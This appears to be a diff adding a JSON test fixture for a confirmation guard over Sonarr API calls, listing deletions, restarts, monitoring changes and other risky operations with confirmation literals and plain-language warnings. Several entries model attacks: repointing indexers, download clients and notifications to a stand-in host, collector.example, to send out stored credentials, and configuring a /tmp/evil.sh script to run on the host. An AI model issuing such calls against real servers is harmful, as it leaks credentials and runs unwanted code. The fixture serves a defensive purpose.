@@ -1,0 +1,388 @@
+{
+  "DELETE /api/v3/episodefile/bulk": {
+    "confirmLiteral": "2 items",
+    "resolved": "DELETE /api/v3/episodefile/bulk",
+    "targets": [
+      {
+        "id": "13",
+        "kind": "episodefile",
+        "name": "Severance (2022): /tv/Severance/Season 01/Severance - S01E01.mkv"
+      },
+      {
+        "id": "16",
+        "kind": "episodefile",
+        "name": "The Expanse (2015): /tv/The Expanse/Season 01/The Expanse - S01E01.mkv"
+      }
+    ],
+    "text": "Sonarr DELETE /api/v3/episodefile/bulk on Severance (2022): /tv/Severance/Season 01/Severance - S01E01.mkv; The Expanse (2015): /tv/The Expanse/Season 01/The Expanse - S01E01.mkv {\"episodeFileIds\":[13,16]} (deletes the files from disk)"
+  },
+  "DELETE /api/v3/queue/bulk": {
+    "confirmLiteral": "1 item",
+    "resolved": "DELETE /api/v3/queue/bulk",
+    "targets": [],
+    "text": "Sonarr DELETE /api/v3/queue/bulk {\"ids\":[41]}"
+  },
+  "DELETE /api/v3/series/editor": {
+    "confirmLiteral": "1 series",
+    "resolved": "DELETE /api/v3/series/editor",
+    "targets": [
+      {
+        "id": "2",
+        "kind": "series",
+        "name": "The Expanse (2015) at /tv/The Expanse"
+      }
+    ],
+    "text": "Sonarr DELETE /api/v3/series/editor on The Expanse (2015) at /tv/The Expanse {\"seriesIds\":[2],\"deleteFiles\":false}"
+  },
+  "DELETE /api/v3/series/editor#delete-files": {
+    "confirmLiteral": "2 series",
+    "resolved": "DELETE /api/v3/series/editor#delete-files",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "series",
+        "name": "Severance (2022) at /tv/Severance"
+      },
+      {
+        "id": "2",
+        "kind": "series",
+        "name": "The Expanse (2015) at /tv/The Expanse"
+      }
+    ],
+    "text": "Sonarr DELETE /api/v3/series/editor on Severance (2022) at /tv/Severance; The Expanse (2015) at /tv/The Expanse {\"seriesIds\":[1,2],\"deleteFiles\":true} (also deletes the files from disk)"
+  },
+  "POST /api/v3/command#heavy": {
+    "confirmLiteral": "RenameFiles",
+    "resolved": "POST /api/v3/command#heavy",
+    "targets": [],
+    "text": "Sonarr POST /api/v3/command {\"name\":\"RenameFiles\",\"seriesId\":1,\"files\":[13]} (renames, moves or deletes files, clears data, or changes the application)"
+  },
+  "POST /api/v3/downloadclient#folder": {
+    "confirmLiteral": "Drop",
+    "resolved": "POST /api/v3/downloadclient#folder",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "downloadclient",
+        "name": "downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/downloadclient on downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w {\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Sonarr host)"
+  },
+  "POST /api/v3/downloadclient/action/{name}#folder": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v3/downloadclient/action/{name}#folder",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/downloadclient/action/getCategories on downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w {\"id\":6,\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Sonarr host)"
+  },
+  "POST /api/v3/downloadclient/action/{name}#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v3/downloadclient/action/{name}#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/downloadclient/action/getCategories on downloadclient qBit (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/downloadclient/test#folder": {
+    "confirmLiteral": "Drop",
+    "resolved": "POST /api/v3/downloadclient/test#folder",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "downloadclient",
+        "name": "downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/downloadclient/test on downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w {\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Sonarr host)"
+  },
+  "POST /api/v3/downloadclient/test#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v3/downloadclient/test#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/downloadclient/test on downloadclient qBit (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/importlist/action/{name}#stored": {
+    "confirmLiteral": "Sonarr 4K",
+    "resolved": "POST /api/v3/importlist/action/{name}#stored",
+    "targets": [
+      {
+        "id": "8",
+        "kind": "importlist",
+        "name": "importlist Sonarr 4K (SonarrImport) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/importlist/action/getCategories on importlist Sonarr 4K (SonarrImport) → https://collector.example:443 {\"id\":8,\"name\":\"Sonarr 4K\",\"implementation\":\"SonarrImport\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/importlist/test#stored": {
+    "confirmLiteral": "Sonarr 4K",
+    "resolved": "POST /api/v3/importlist/test#stored",
+    "targets": [
+      {
+        "id": "8",
+        "kind": "importlist",
+        "name": "importlist Sonarr 4K (SonarrImport) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/importlist/test on importlist Sonarr 4K (SonarrImport) → https://collector.example:443 {\"id\":8,\"name\":\"Sonarr 4K\",\"implementation\":\"SonarrImport\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/indexer/action/{name}#stored": {
+    "confirmLiteral": "NZBgeek",
+    "resolved": "POST /api/v3/indexer/action/{name}#stored",
+    "targets": [
+      {
+        "id": "7",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Newznab) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/indexer/action/getCategories on indexer NZBgeek (Newznab) → https://collector.example:443 {\"id\":7,\"name\":\"NZBgeek\",\"implementation\":\"Newznab\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/indexer/test#stored": {
+    "confirmLiteral": "NZBgeek",
+    "resolved": "POST /api/v3/indexer/test#stored",
+    "targets": [
+      {
+        "id": "7",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Newznab) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/indexer/test on indexer NZBgeek (Newznab) → https://collector.example:443 {\"id\":7,\"name\":\"NZBgeek\",\"implementation\":\"Newznab\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/notification#script": {
+    "confirmLiteral": "Run it",
+    "resolved": "POST /api/v3/notification#script",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "notification",
+        "name": "notification Run it (CustomScript), runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/notification on notification Run it (CustomScript), runs /tmp/evil.sh {\"name\":\"Run it\",\"implementation\":\"CustomScript\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Sonarr host)"
+  },
+  "POST /api/v3/notification/action/{name}#script": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v3/notification/action/{name}#script",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/notification/action/getDevices on notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh {\"id\":9,\"name\":\"Discord\",\"implementation\":\"CustomScript\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Sonarr host)"
+  },
+  "POST /api/v3/notification/action/{name}#stored": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v3/notification/action/{name}#stored",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/notification/action/getCategories on notification Discord (Discord) → https://collector.example:443 {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/notification/test#script": {
+    "confirmLiteral": "New",
+    "resolved": "POST /api/v3/notification/test#script",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "notification",
+        "name": "notification New (Webhook) → https://h.example, runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/notification/test on notification New (Webhook) → https://h.example, runs /tmp/evil.sh {\"name\":\"New\",\"implementation\":\"Webhook\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Sonarr host)"
+  },
+  "POST /api/v3/notification/test#stored": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v3/notification/test#stored",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/notification/test on notification Discord (Discord) → https://collector.example:443 {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v3/notification/testall#script": {
+    "confirmLiteral": "Home Sonarr",
+    "resolved": "POST /api/v3/notification/testall#script",
+    "targets": [],
+    "text": "Sonarr POST /api/v3/notification/testall (runs a program on the Sonarr host)"
+  },
+  "POST /api/v3/seasonpass": {
+    "confirmLiteral": "2 series",
+    "resolved": "POST /api/v3/seasonpass",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "series",
+        "name": "Severance (2022) at /tv/Severance"
+      },
+      {
+        "id": "2",
+        "kind": "series",
+        "name": "The Expanse (2015) at /tv/The Expanse"
+      }
+    ],
+    "text": "Sonarr POST /api/v3/seasonpass on Severance (2022) at /tv/Severance; The Expanse (2015) at /tv/The Expanse {\"series\":[{\"id\":1,\"monitored\":false},{\"id\":2}],\"monitoringOptions\":{\"monitor\":\"none\"}} (changes series and season monitoring in bulk)"
+  },
+  "POST /api/v3/system/backup/restore/{id}": {
+    "confirmLiteral": "sonarr_backup_v4.0.20.3014_2026.10.14_10.00.00.zip",
+    "resolved": "POST /api/v3/system/backup/restore/{id}",
+    "targets": [],
+    "text": "Sonarr POST /api/v3/system/backup/restore/21 (replaces the database and settings, then restarts)"
+  },
+  "POST /api/v3/system/restart": {
+    "confirmLiteral": "Home Sonarr",
+    "resolved": "POST /api/v3/system/restart",
+    "targets": [],
+    "text": "Sonarr POST /api/v3/system/restart"
+  },
+  "POST /api/v3/system/shutdown": {
+    "confirmLiteral": "Home Sonarr",
+    "resolved": "POST /api/v3/system/shutdown",
+    "targets": [],
+    "text": "Sonarr POST /api/v3/system/shutdown"
+  },
+  "PUT /api/v3/config/host/{id}": {
+    "confirmLiteral": "Home Sonarr",
+    "resolved": "PUT /api/v3/config/host/{id}",
+    "targets": [],
+    "text": "Sonarr PUT /api/v3/config/host/1 {\"id\":1,\"bindAddress\":\"*\",\"urlBase\":\"/sonarr\"} (sign-in, bind address, port, URL base, proxy and update script)"
+  },
+  "PUT /api/v3/config/mediamanagement/{id}": {
+    "confirmLiteral": "Home Sonarr",
+    "resolved": "PUT /api/v3/config/mediamanagement/{id}",
+    "targets": [
+      {
+        "id": "scriptImportPath",
+        "kind": "script",
+        "name": "import script on: /tmp/evil.sh"
+      }
+    ],
+    "text": "Sonarr PUT /api/v3/config/mediamanagement/1 on import script on: /tmp/evil.sh {\"id\":1,\"useScriptImport\":true,\"scriptImportPath\":\"/tmp/evil.sh\"} (import script, file permissions and owner, recycle bin)"
+  },
+  "PUT /api/v3/downloadclient/{id}#folder": {
+    "confirmLiteral": "qBit",
+    "resolved": "PUT /api/v3/downloadclient/{id}#folder",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Sonarr PUT /api/v3/downloadclient/6 on downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w {\"id\":6,\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Sonarr host)"
+  },
+  "PUT /api/v3/downloadclient/{id}#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "PUT /api/v3/downloadclient/{id}#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr PUT /api/v3/downloadclient/6 on downloadclient qBit (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v3/importlist/{id}#stored": {
+    "confirmLiteral": "Sonarr 4K",
+    "resolved": "PUT /api/v3/importlist/{id}#stored",
+    "targets": [
+      {
+        "id": "8",
+        "kind": "importlist",
+        "name": "importlist Sonarr 4K (SonarrImport) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr PUT /api/v3/importlist/8 on importlist Sonarr 4K (SonarrImport) → https://collector.example:443 {\"id\":8,\"name\":\"Sonarr 4K\",\"implementation\":\"SonarrImport\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v3/indexer/{id}#stored": {
+    "confirmLiteral": "NZBgeek",
+    "resolved": "PUT /api/v3/indexer/{id}#stored",
+    "targets": [
+      {
+        "id": "7",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Newznab) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr PUT /api/v3/indexer/7 on indexer NZBgeek (Newznab) → https://collector.example:443 {\"id\":7,\"name\":\"NZBgeek\",\"implementation\":\"Newznab\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v3/notification/{id}#script": {
+    "confirmLiteral": "Discord",
+    "resolved": "PUT /api/v3/notification/{id}#script",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Sonarr PUT /api/v3/notification/9 on notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh {\"id\":9,\"name\":\"Renamed\",\"implementation\":\"CustomScript\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Sonarr host)"
+  },
+  "PUT /api/v3/notification/{id}#stored": {
+    "confirmLiteral": "Discord",
+    "resolved": "PUT /api/v3/notification/{id}#stored",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example:443"
+      }
+    ],
+    "text": "Sonarr PUT /api/v3/notification/9 on notification Discord (Discord) → https://collector.example:443 {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v3/series/editor": {
+    "confirmLiteral": "2 series",
+    "resolved": "PUT /api/v3/series/editor",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "series",
+        "name": "Severance (2022) at /tv/Severance"
+      },
+      {
+        "id": "2",
+        "kind": "series",
+        "name": "The Expanse (2015) at /tv/The Expanse"
+      }
+    ],
+    "text": "Sonarr PUT /api/v3/series/editor on Severance (2022) at /tv/Severance; The Expanse (2015) at /tv/The Expanse {\"seriesIds\":[1,2],\"monitored\":false}"
+  },
+  "PUT /api/v3/series/{id}#move-files": {
+    "confirmLiteral": "The Expanse",
+    "resolved": "PUT /api/v3/series/{id}#move-files",
+    "targets": [
+      {
+        "id": "2",
+        "kind": "series",
+        "name": "The Expanse (2015) at /tv/The Expanse → /elsewhere/The Expanse"
+      }
+    ],
+    "text": "Sonarr PUT /api/v3/series/2?moveFiles=true on The Expanse (2015) at /tv/The Expanse → /elsewhere/The Expanse {\"id\":2,\"title\":\"Not The Expanse\",\"path\":\"/elsewhere/The Expanse\"} (moves the files on disk)"
+  }
+}
